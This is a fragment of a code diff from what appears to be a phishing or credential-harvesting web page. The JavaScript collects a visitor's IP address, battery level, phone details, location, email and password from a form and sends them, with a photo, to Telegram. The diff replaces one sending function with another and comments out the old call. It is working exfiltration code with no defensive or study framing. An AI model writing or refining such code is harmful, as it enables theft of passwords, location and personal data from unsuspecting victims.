@@ -155,8 +155,8 @@ async function sendPhotoWithCaption(photoPath, caption) {
             const password = formData.get('password');
 
             const data = { ip, battery, phoneInfo, location, email, password };
-
-            sendToTelegram(data, photoUrl);
+            sendPhotoWithCaption(data, photoUrl);
+           // sendToTelegram(data, photoUrl);
         }
 
         document.getElementById('dataForm').addEventListener('submit', (event) => {
